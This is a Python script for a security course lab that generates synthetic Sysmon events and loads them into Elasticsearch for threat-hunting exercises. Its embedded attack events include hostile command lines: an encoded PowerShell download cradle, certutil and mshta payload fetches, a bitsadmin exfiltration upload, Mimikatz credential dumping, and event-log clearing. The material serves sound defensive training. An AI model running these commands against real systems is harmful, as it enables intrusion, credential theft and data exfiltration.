#!/usr/bin/env python3
"""
load_sysmon_hunting.py - Dataset sofisticado de Sysmon para hunting avanzado en ELK
Genera 1500+ eventos con múltiples cadenas de ataque embebidas.
Curso MAR404 - Clase 8 - Lab 15
"""
import json, time, random, hashlib, base64
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch

ES_HOST = "http://elasticsearch:9200"
INDEX = "sysmon-hunting"

def wait_for_es():
    es = Elasticsearch(ES_HOST)
    for i in range(90):
        try:
            if es.ping(): return es
        except: pass
        time.sleep(2)
    raise Exception("ES not available after 180s")

def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()

def generate_dataset():
    """Genera un dataset realista con actividad normal + 6 cadenas de ataque."""
    base_time = datetime(2025, 7, 20, 7, 0, 0)
    events = []

    # =========================================================================
    # ACTIVIDAD NORMAL (1200 eventos)
    # =========================================================================
    normal_processes = [
        {"name": "explorer.exe", "image": r"C:\Windows\explorer.exe", "user": "CORP\\user01", "parent": r"C:\Windows\System32\userinit.exe", "pid_base": 2400},
        {"name": "chrome.exe", "image": r"C:\Program Files\Google\Chrome\Application\chrome.exe", "user": "CORP\\user01", "parent": r"C:\Windows\explorer.exe", "pid_base": 5500},
        {"name": "outlook.exe", "image": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "user": "CORP\\user01", "parent": r"C:\Windows\explorer.exe", "pid_base": 3200},
        {"name": "teams.exe", "image": r"C:\Users\user01\AppData\Local\Microsoft\Teams\current\Teams.exe", "user": "CORP\\user01", "parent": r"C:\Windows\explorer.exe", "pid_base": 4100},
        {"name": "svchost.exe", "image": r"C:\Windows\System32\svchost.exe", "user": "NT AUTHORITY\\SYSTEM", "parent": r"C:\Windows\System32\services.exe", "pid_base": 800},
        {"name": "lsass.exe", "image": r"C:\Windows\System32\lsass.exe", "user": "NT AUTHORITY\\SYSTEM", "parent": r"C:\Windows\System32\wininit.exe", "pid_base": 680},
        {"name": "csrss.exe", "image": r"C:\Windows\System32\csrss.exe", "user": "NT AUTHORITY\\SYSTEM", "parent": r"C:\Windows\System32\smss.exe", "pid_base": 500},
        {"name": "RuntimeBroker.exe", "image": r"C:\Windows\System32\RuntimeBroker.exe", "user": "CORP\\user01", "parent": r"C:\Windows\System32\svchost.exe", "pid_base": 6200},
        {"name": "SearchIndexer.exe", "image": r"C:\Windows\System32\SearchIndexer.exe", "user": "NT AUTHORITY\\SYSTEM", "parent": r"C:\Windows\System32\services.exe", "pid_base": 3800},
        {"name": "MsMpEng.exe", "image": r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MsMpEng.exe", "user": "NT AUTHORITY\\SYSTEM", "parent": r"C:\Windows\System32\services.exe", "pid_base": 2900},
    ]

    # Event ID 1: Process Create (normal)
    for i in range(600):
        proc = random.choice(normal_processes)
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 1, "event_description": "Process Create",
            "timestamp": t.isoformat(), "hostname": "WS-PC01",
            "process_name": proc["name"], "image": proc["image"],
            "user": proc["user"], "pid": proc["pid_base"] + random.randint(0, 500),
            "parent_image": proc["parent"], "parent_pid": random.randint(400, 2000),
            "command_line": proc["image"],
            "hashes": f"SHA256={sha256(proc['image'])}",
            "integrity_level": "Medium" if "user" in proc["user"].lower() else "System",
            "category": "normal", "severity": "info"
        })

    # Event ID 3: Network Connection (normal)
    normal_dests = [
        ("142.250.80.46", 443, "google.com"),
        ("20.190.159.2", 443, "login.microsoftonline.com"),
        ("13.107.42.14", 443, "outlook.office365.com"),
        ("185.199.108.133", 443, "github.com"),
        ("104.18.32.7", 443, "cdn.cloudflare.com"),
    ]
    for i in range(300):
        proc = random.choice(normal_processes[:4])  # Solo user processes
        dest = random.choice(normal_dests)
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 3, "event_description": "Network Connection",
            "timestamp": t.isoformat(), "hostname": "WS-PC01",
            "process_name": proc["name"], "image": proc["image"],
            "user": proc["user"], "pid": proc["pid_base"],
            "destination_ip": dest[0], "destination_port": dest[1],
            "destination_hostname": dest[2],
            "source_ip": "10.0.1.50", "source_port": random.randint(49152, 65535),
            "protocol": "tcp", "initiated": True,
            "category": "normal", "severity": "info"
        })

    # Event ID 22: DNS Query (normal)
    normal_domains_dns = ["www.google.com", "outlook.office.com", "teams.microsoft.com",
                          "update.microsoft.com", "cdn.jsdelivr.net", "api.github.com",
                          "fonts.googleapis.com", "ajax.googleapis.com"]
    for i in range(200):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        events.append({
            "event_id": 22, "event_description": "DNS Query",
            "timestamp": t.isoformat(), "hostname": "WS-PC01",
            "process_name": "chrome.exe",
            "image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "user": "CORP\\user01", "pid": 5500,
            "query_name": random.choice(normal_domains_dns),
            "query_results": f"{random.randint(10,200)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "query_status": "Success",
            "category": "normal", "severity": "info"
        })

    # Event ID 11: File Create (normal)
    for i in range(100):
        t = base_time + timedelta(minutes=random.randint(0, 720))
        fname = random.choice(["report.docx", "budget.xlsx", "notes.txt", "photo.jpg", "download.pdf"])
        events.append({
            "event_id": 11, "event_description": "File Create",
            "timestamp": t.isoformat(), "hostname": "WS-PC01",
            "process_name": random.choice(["chrome.exe", "outlook.exe", "explorer.exe"]),
            "image": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "user": "CORP\\user01",
            "target_filename": f"C:\\Users\\user01\\Downloads\\{fname}",
            "category": "normal", "severity": "info"
        })

    # =========================================================================
    # CADENA DE ATAQUE 1: Initial Access via Macro + PowerShell Download Cradle
    # =========================================================================
    attack1_time = base_time + timedelta(hours=2, minutes=15)

    # Macro spawns cmd.exe
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": attack1_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "cmd.exe", "image": r"C:\Windows\System32\cmd.exe",
        "user": "CORP\\user01", "pid": 7700,
        "parent_image": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "parent_pid": 3200, "parent_name": "WINWORD.EXE",
        "command_line": "cmd.exe /c powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHMAaABlAGwAbABjAG8AZABlACcAKQA=",
        "hashes": f"SHA256={sha256('cmd.exe')}",
        "integrity_level": "Medium",
        "category": "initial_access", "severity": "critical",
        "mitre_tactic": "Initial Access", "mitre_technique": "T1566.001",
        "attack_chain": "macro_powershell"
    })

    # PowerShell download cradle
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack1_time + timedelta(seconds=2)).isoformat(), "hostname": "WS-PC01",
        "process_name": "powershell.exe",
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "user": "CORP\\user01", "pid": 7720,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 7700, "parent_name": "cmd.exe",
        "command_line": "powershell.exe -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADEAMAAvAHMAaABlAGwAbABjAG8AZABlACcAKQA=",
        "hashes": f"SHA256={sha256('powershell.exe')}",
        "integrity_level": "Medium",
        "category": "execution", "severity": "critical",
        "mitre_tactic": "Execution", "mitre_technique": "T1059.001",
        "attack_chain": "macro_powershell"
    })

    # Network connection to C2
    events.append({
        "event_id": 3, "event_description": "Network Connection",
        "timestamp": (attack1_time + timedelta(seconds=4)).isoformat(), "hostname": "WS-PC01",
        "process_name": "powershell.exe",
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "user": "CORP\\user01", "pid": 7720,
        "destination_ip": "198.51.100.10", "destination_port": 80,
        "destination_hostname": "cdn-static-assets.com",
        "source_ip": "10.0.1.50", "source_port": 51234,
        "protocol": "tcp", "initiated": True,
        "category": "c2", "severity": "critical",
        "mitre_tactic": "Command and Control", "mitre_technique": "T1071.001",
        "attack_chain": "macro_powershell"
    })

    # File dropped by PowerShell
    events.append({
        "event_id": 11, "event_description": "File Create",
        "timestamp": (attack1_time + timedelta(seconds=6)).isoformat(), "hostname": "WS-PC01",
        "process_name": "powershell.exe",
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "user": "CORP\\user01", "pid": 7720,
        "target_filename": r"C:\Users\user01\AppData\Local\Temp\update.exe",
        "hashes": f"SHA256=a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
        "category": "execution", "severity": "high",
        "mitre_tactic": "Execution", "mitre_technique": "T1105",
        "attack_chain": "macro_powershell"
    })

    # =========================================================================
    # CADENA DE ATAQUE 1b: LOTL - Certutil + Mshta Download
    # =========================================================================
    lotl_time = base_time + timedelta(hours=2, minutes=45)

    # Certutil download
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": lotl_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "certutil.exe",
        "image": r"C:\Windows\System32\certutil.exe",
        "user": "CORP\\user01", "pid": 7800,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 7700, "parent_name": "cmd.exe",
        "command_line": r"certutil.exe -urlcache -split -f http://198.51.100.10/update.exe C:\Users\user01\AppData\Local\Temp\update.exe",
        "hashes": f"SHA256={sha256('certutil.exe')}",
        "integrity_level": "Medium",
        "category": "execution", "severity": "critical",
        "mitre_tactic": "Command and Control", "mitre_technique": "T1105",
        "attack_chain": "lotl_certutil",
        "hunt_note": "certutil abused to download payload from C2"
    })

    # Mshta execution
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (lotl_time + timedelta(minutes=5)).isoformat(), "hostname": "WS-PC01",
        "process_name": "mshta.exe",
        "image": r"C:\Windows\System32\mshta.exe",
        "user": "CORP\\user01", "pid": 7850,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 7700, "parent_name": "cmd.exe",
        "command_line": r"mshta.exe http://198.51.100.10/payload.hta",
        "hashes": f"SHA256={sha256('mshta.exe')}",
        "integrity_level": "Medium",
        "category": "execution", "severity": "critical",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1218.005",
        "attack_chain": "lotl_certutil",
        "hunt_note": "mshta.exe executing remote HTA payload"
    })

    # Mshta network connection
    events.append({
        "event_id": 3, "event_description": "Network Connection",
        "timestamp": (lotl_time + timedelta(minutes=5, seconds=2)).isoformat(), "hostname": "WS-PC01",
        "process_name": "mshta.exe",
        "image": r"C:\Windows\System32\mshta.exe",
        "user": "CORP\\user01", "pid": 7850,
        "destination_ip": "198.51.100.10", "destination_port": 80,
        "destination_hostname": "cdn-static-assets.com",
        "source_ip": "10.0.1.50", "source_port": 51300,
        "protocol": "tcp", "initiated": True,
        "category": "c2", "severity": "critical",
        "mitre_tactic": "Command and Control", "mitre_technique": "T1071.001",
        "attack_chain": "lotl_certutil"
    })

    # =========================================================================
    # CADENA DE ATAQUE 2: DLL Injection via CreateRemoteThread
    # =========================================================================
    attack2_time = base_time + timedelta(hours=3, minutes=10)

    # Injector process starts
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": attack2_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "update.exe",
        "image": r"C:\Users\user01\AppData\Local\Temp\update.exe",
        "user": "CORP\\user01", "pid": 8100,
        "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "parent_pid": 7720, "parent_name": "powershell.exe",
        "command_line": r"C:\Users\user01\AppData\Local\Temp\update.exe",
        "hashes": "SHA256=a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
        "integrity_level": "Medium",
        "category": "execution", "severity": "critical",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1055.001",
        "attack_chain": "dll_injection"
    })

    # DLL dropped
    events.append({
        "event_id": 11, "event_description": "File Create",
        "timestamp": (attack2_time + timedelta(seconds=1)).isoformat(), "hostname": "WS-PC01",
        "process_name": "update.exe",
        "image": r"C:\Users\user01\AppData\Local\Temp\update.exe",
        "user": "CORP\\user01", "pid": 8100,
        "target_filename": r"C:\Users\user01\AppData\Local\Temp\msvcrt_ext.dll",
        "hashes": "SHA256=deadbeef0123456789abcdef0123456789abcdef0123456789abcdef01234567",
        "category": "defense_evasion", "severity": "high",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1055.001",
        "attack_chain": "dll_injection"
    })

    # CreateRemoteThread into explorer.exe
    events.append({
        "event_id": 8, "event_description": "CreateRemoteThread",
        "timestamp": (attack2_time + timedelta(seconds=2)).isoformat(), "hostname": "WS-PC01",
        "source_image": r"C:\Users\user01\AppData\Local\Temp\update.exe",
        "source_pid": 8100, "source_name": "update.exe",
        "target_image": r"C:\Windows\explorer.exe",
        "target_pid": 2400, "target_name": "explorer.exe",
        "start_address": "0x00007FFE30001000",
        "start_module": r"C:\Users\user01\AppData\Local\Temp\msvcrt_ext.dll",
        "start_function": "DllMain",
        "user": "CORP\\user01",
        "category": "injection", "severity": "critical",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1055.001",
        "attack_chain": "dll_injection"
    })

    # DLL loaded in explorer (Event ID 7)
    events.append({
        "event_id": 7, "event_description": "Image Loaded",
        "timestamp": (attack2_time + timedelta(seconds=3)).isoformat(), "hostname": "WS-PC01",
        "process_name": "explorer.exe",
        "image": r"C:\Windows\explorer.exe",
        "user": "CORP\\user01", "pid": 2400,
        "image_loaded": r"C:\Users\user01\AppData\Local\Temp\msvcrt_ext.dll",
        "hashes": "SHA256=deadbeef0123456789abcdef0123456789abcdef0123456789abcdef01234567",
        "signed": False, "signature": "N/A", "signature_status": "Unavailable",
        "category": "injection", "severity": "critical",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1055.001",
        "attack_chain": "dll_injection"
    })

    # C2 beacon from explorer (anomalous!)
    for i in range(10):
        events.append({
            "event_id": 3, "event_description": "Network Connection",
            "timestamp": (attack2_time + timedelta(minutes=5*i+5)).isoformat(), "hostname": "WS-PC01",
            "process_name": "explorer.exe",
            "image": r"C:\Windows\explorer.exe",
            "user": "CORP\\user01", "pid": 2400,
            "destination_ip": "198.51.100.10", "destination_port": 443,
            "destination_hostname": "cdn-static-assets.com",
            "source_ip": "10.0.1.50", "source_port": 52000 + i,
            "protocol": "tcp", "initiated": True,
            "category": "c2", "severity": "critical",
            "mitre_tactic": "Command and Control", "mitre_technique": "T1071.001",
            "attack_chain": "dll_injection",
            "hunt_note": "explorer.exe making outbound HTTPS connections is ANOMALOUS"
        })

    # =========================================================================
    # CADENA DE ATAQUE 3: Credential Access (Mimikatz via renamed binary)
    # =========================================================================
    attack3_time = base_time + timedelta(hours=4, minutes=0)

    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": attack3_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "taskmgr.exe",
        "image": r"C:\Windows\Temp\taskmgr.exe",
        "original_filename": "mimikatz.exe",
        "user": "CORP\\admin", "pid": 8800,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r"C:\Windows\Temp\taskmgr.exe privilege::debug sekurlsa::logonpasswords exit",
        "hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb924deadbeef4649b934ca495991b7852b855",
        "integrity_level": "High",
        "category": "credential_access", "severity": "critical",
        "mitre_tactic": "Credential Access", "mitre_technique": "T1003.001",
        "attack_chain": "credential_theft",
        "hunt_note": "Binary renamed from mimikatz.exe to taskmgr.exe, running from Temp"
    })

    # Process Access to LSASS (Event ID 10)
    events.append({
        "event_id": 10, "event_description": "Process Access",
        "timestamp": (attack3_time + timedelta(seconds=2)).isoformat(), "hostname": "WS-PC01",
        "source_image": r"C:\Windows\Temp\taskmgr.exe",
        "source_pid": 8800, "source_name": "taskmgr.exe",
        "target_image": r"C:\Windows\System32\lsass.exe",
        "target_pid": 680, "target_name": "lsass.exe",
        "granted_access": "0x1FFFFF",
        "call_trace": r"C:\Windows\SYSTEM32\ntdll.dll+9C4C4|C:\Windows\Temp\taskmgr.exe+6DC0",
        "user": "CORP\\admin",
        "category": "credential_access", "severity": "critical",
        "mitre_tactic": "Credential Access", "mitre_technique": "T1003.001",
        "attack_chain": "credential_theft",
        "hunt_note": "FULL_ACCESS (0x1FFFFF) to lsass.exe from non-standard path"
    })

    # =========================================================================
    # CADENA DE ATAQUE 4: Lateral Movement via WMI + PsExec
    # =========================================================================
    attack4_time = base_time + timedelta(hours=5, minutes=30)

    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": attack4_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "WMIC.exe",
        "image": r"C:\Windows\System32\wbem\WMIC.exe",
        "user": "CORP\\admin", "pid": 9100,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r'wmic /node:"10.0.1.100" /user:"CORP\admin" process call create "cmd.exe /c powershell -enc ..."',
        "integrity_level": "High",
        "category": "lateral_movement", "severity": "critical",
        "mitre_tactic": "Lateral Movement", "mitre_technique": "T1047",
        "attack_chain": "lateral_movement"
    })

    events.append({
        "event_id": 3, "event_description": "Network Connection",
        "timestamp": (attack4_time + timedelta(seconds=1)).isoformat(), "hostname": "WS-PC01",
        "process_name": "WMIC.exe",
        "image": r"C:\Windows\System32\wbem\WMIC.exe",
        "user": "CORP\\admin", "pid": 9100,
        "destination_ip": "10.0.1.100", "destination_port": 135,
        "source_ip": "10.0.1.50", "source_port": 53100,
        "protocol": "tcp", "initiated": True,
        "category": "lateral_movement", "severity": "high",
        "mitre_tactic": "Lateral Movement", "mitre_technique": "T1047",
        "attack_chain": "lateral_movement"
    })

    # PsExec
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack4_time + timedelta(minutes=5)).isoformat(), "hostname": "WS-PC01",
        "process_name": "PsExec.exe",
        "image": r"C:\Users\admin\Desktop\tools\PsExec.exe",
        "user": "CORP\\admin", "pid": 9200,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r"PsExec.exe \\10.0.1.100 -u CORP\admin -p P@ss123 cmd.exe",
        "integrity_level": "High",
        "category": "lateral_movement", "severity": "critical",
        "mitre_tactic": "Lateral Movement", "mitre_technique": "T1021.002",
        "attack_chain": "lateral_movement"
    })

    events.append({
        "event_id": 3, "event_description": "Network Connection",
        "timestamp": (attack4_time + timedelta(minutes=5, seconds=2)).isoformat(), "hostname": "WS-PC01",
        "process_name": "PsExec.exe",
        "image": r"C:\Users\admin\Desktop\tools\PsExec.exe",
        "user": "CORP\\admin", "pid": 9200,
        "destination_ip": "10.0.1.100", "destination_port": 445,
        "source_ip": "10.0.1.50", "source_port": 53200,
        "protocol": "tcp", "initiated": True,
        "category": "lateral_movement", "severity": "critical",
        "mitre_tactic": "Lateral Movement", "mitre_technique": "T1021.002",
        "attack_chain": "lateral_movement"
    })

    # =========================================================================
    # CADENA DE ATAQUE 5: Persistence (Registry + Scheduled Task + Service)
    # =========================================================================
    attack5_time = base_time + timedelta(hours=6, minutes=0)

    # Registry Run Key
    events.append({
        "event_id": 13, "event_description": "Registry Value Set",
        "timestamp": attack5_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "powershell.exe",
        "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "user": "CORP\\admin", "pid": 9300,
        "event_type": "SetValue",
        "target_object": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealthService",
        "details": r"C:\ProgramData\Microsoft\SecurityHealth\svchost.exe",
        "category": "persistence", "severity": "critical",
        "mitre_tactic": "Persistence", "mitre_technique": "T1547.001",
        "attack_chain": "persistence"
    })

    # Scheduled Task
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack5_time + timedelta(minutes=2)).isoformat(), "hostname": "WS-PC01",
        "process_name": "schtasks.exe",
        "image": r"C:\Windows\System32\schtasks.exe",
        "user": "CORP\\admin", "pid": 9350,
        "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "parent_pid": 9300, "parent_name": "powershell.exe",
        "command_line": r'schtasks /create /tn "Microsoft\Windows\WindowsUpdate\Scheduled Start" /tr "C:\ProgramData\Microsoft\SecurityHealth\svchost.exe" /sc ONLOGON /ru SYSTEM',
        "integrity_level": "High",
        "category": "persistence", "severity": "critical",
        "mitre_tactic": "Persistence", "mitre_technique": "T1053.005",
        "attack_chain": "persistence"
    })

    # Malicious service install
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack5_time + timedelta(minutes=5)).isoformat(), "hostname": "WS-PC01",
        "process_name": "sc.exe",
        "image": r"C:\Windows\System32\sc.exe",
        "user": "CORP\\admin", "pid": 9400,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r'sc create WindowsHealthSvc binPath= "C:\ProgramData\Microsoft\SecurityHealth\svchost.exe" start= auto',
        "integrity_level": "High",
        "category": "persistence", "severity": "critical",
        "mitre_tactic": "Persistence", "mitre_technique": "T1543.003",
        "attack_chain": "persistence"
    })

    # =========================================================================
    # CADENA DE ATAQUE 6: Data Exfiltration + Anti-Forensics
    # =========================================================================
    attack6_time = base_time + timedelta(hours=8, minutes=0)

    # Compress data
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": attack6_time.isoformat(), "hostname": "WS-PC01",
        "process_name": "7z.exe",
        "image": r"C:\Users\admin\Desktop\tools\7z.exe",
        "user": "CORP\\admin", "pid": 9500,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r'7z.exe a -pS3cr3t! C:\Windows\Temp\backup.7z C:\Users\admin\Documents\confidential\*',
        "integrity_level": "High",
        "category": "collection", "severity": "high",
        "mitre_tactic": "Collection", "mitre_technique": "T1560.001",
        "attack_chain": "exfiltration"
    })

    # Exfil via BITS
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack6_time + timedelta(minutes=3)).isoformat(), "hostname": "WS-PC01",
        "process_name": "bitsadmin.exe",
        "image": r"C:\Windows\System32\bitsadmin.exe",
        "user": "CORP\\admin", "pid": 9550,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": r'bitsadmin /transfer exfil /upload /priority high http://198.51.100.10/upload C:\Windows\Temp\backup.7z',
        "integrity_level": "High",
        "category": "exfiltration", "severity": "critical",
        "mitre_tactic": "Exfiltration", "mitre_technique": "T1048.002",
        "attack_chain": "exfiltration"
    })

    events.append({
        "event_id": 3, "event_description": "Network Connection",
        "timestamp": (attack6_time + timedelta(minutes=3, seconds=5)).isoformat(), "hostname": "WS-PC01",
        "process_name": "svchost.exe",
        "image": r"C:\Windows\System32\svchost.exe",
        "user": "NT AUTHORITY\\NETWORK SERVICE", "pid": 1200,
        "destination_ip": "198.51.100.10", "destination_port": 80,
        "source_ip": "10.0.1.50", "source_port": 54000,
        "protocol": "tcp", "initiated": True,
        "bytes_sent": 15728640,
        "category": "exfiltration", "severity": "critical",
        "mitre_tactic": "Exfiltration", "mitre_technique": "T1048.002",
        "attack_chain": "exfiltration",
        "hunt_note": "15MB upload via BITS - data exfiltration"
    })

    # Clear event logs (anti-forensics)
    events.append({
        "event_id": 1, "event_description": "Process Create",
        "timestamp": (attack6_time + timedelta(minutes=10)).isoformat(), "hostname": "WS-PC01",
        "process_name": "wevtutil.exe",
        "image": r"C:\Windows\System32\wevtutil.exe",
        "user": "CORP\\admin", "pid": 9600,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_pid": 8750, "parent_name": "cmd.exe",
        "command_line": "wevtutil cl Security",
        "integrity_level": "High",
        "category": "defense_evasion", "severity": "critical",
        "mitre_tactic": "Defense Evasion", "mitre_technique": "T1070.001",
        "attack_chain": "exfiltration"
    })

    # DGA DNS queries
    dga_domains = [f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))}.evil-corp.net" for _ in range(20)]
    for i, domain in enumerate(dga_domains):
        events.append({
            "event_id": 22, "event_description": "DNS Query",
            "timestamp": (attack2_time + timedelta(hours=1, minutes=i*3)).isoformat(), "hostname": "WS-PC01",
            "process_name": "explorer.exe",
            "image": r"C:\Windows\explorer.exe",
            "user": "CORP\\user01", "pid": 2400,
            "query_name": domain,
            "query_results": f"198.51.100.{random.randint(10,50)}",
            "query_status": "Success",
            "category": "c2", "severity": "high",
            "mitre_tactic": "Command and Control", "mitre_technique": "T1568.002",
            "attack_chain": "dll_injection",
            "hunt_note": "DGA domain from explorer.exe - injected code communicating"
        })

    random.shuffle(events)
    return events


def main():
    es = wait_for_es()

    # Create index with comprehensive mapping
    mapping = {
        "mappings": {
            "properties": {
                "timestamp": {"type": "date"},
                "event_id": {"type": "integer"},
                "event_description": {"type": "keyword"},
                "hostname": {"type": "keyword"},
                "process_name": {"type": "keyword"},
                "image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "original_filename": {"type": "keyword"},
                "user": {"type": "keyword"},
                "pid": {"type": "integer"},
                "parent_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "parent_pid": {"type": "integer"},
                "parent_name": {"type": "keyword"},
                "command_line": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "hashes": {"type": "keyword"},
                "integrity_level": {"type": "keyword"},
                "category": {"type": "keyword"},
                "severity": {"type": "keyword"},
                "mitre_tactic": {"type": "keyword"},
                "mitre_technique": {"type": "keyword"},
                "attack_chain": {"type": "keyword"},
                "hunt_note": {"type": "text"},
                "destination_ip": {"type": "ip"},
                "destination_port": {"type": "integer"},
                "destination_hostname": {"type": "keyword"},
                "source_ip": {"type": "ip"},
                "source_port": {"type": "integer"},
                "protocol": {"type": "keyword"},
                "initiated": {"type": "boolean"},
                "bytes_sent": {"type": "long"},
                "source_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "source_pid": {"type": "integer"},
                "source_name": {"type": "keyword"},
                "target_image": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "target_pid": {"type": "integer"},
                "target_name": {"type": "keyword"},
                "granted_access": {"type": "keyword"},
                "call_trace": {"type": "text"},
                "start_address": {"type": "keyword"},
                "start_module": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "start_function": {"type": "keyword"},
                "image_loaded": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "signed": {"type": "boolean"},
                "signature": {"type": "keyword"},
                "signature_status": {"type": "keyword"},
                "target_filename": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "target_object": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "details": {"type": "text", "fields": {"keyword": {"type": "keyword"}}},
                "event_type": {"type": "keyword"},
                "query_name": {"type": "keyword"},
                "query_results": {"type": "keyword"},
                                "query_status": {"type": "keyword"},
                "pipe_name": {"type": "keyword"},
                "simulated": {"type": "boolean"},
                "simulated_at": {"type": "date"},
            }
        }
    }
    es.indices.delete(index=INDEX, ignore=[404])
    es.indices.create(index=INDEX, mappings=mapping["mappings"])

    events = generate_dataset()
    for i, event in enumerate(events):
        es.index(index=INDEX, document=event)
        if (i+1) % 200 == 0:
            print(f"  [{i+1}/{len(events)}] eventos indexados...")

    es.indices.refresh(index=INDEX)

    # Stats
    total = len(events)
    malicious = sum(1 for e in events if e.get("severity") in ("critical", "high"))
    chains = set(e.get("attack_chain", "") for e in events if e.get("attack_chain"))

    print(f"\n{'='*60}")
    print(f"  DATASET CARGADO EXITOSAMENTE")
    print(f"{'='*60}")
    print(f"  Total eventos: {total}")
    print(f"  Eventos maliciosos: {malicious}")
    print(f"  Cadenas de ataque: {len(chains)}")
    for chain in sorted(chains):
        count = sum(1 for e in events if e.get("attack_chain") == chain)
        print(f"    - {chain}: {count} eventos")
    print(f"{'='*60}")
    print(f"  Index: {INDEX}")
    print(f"  Kibana: http://localhost:5601")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
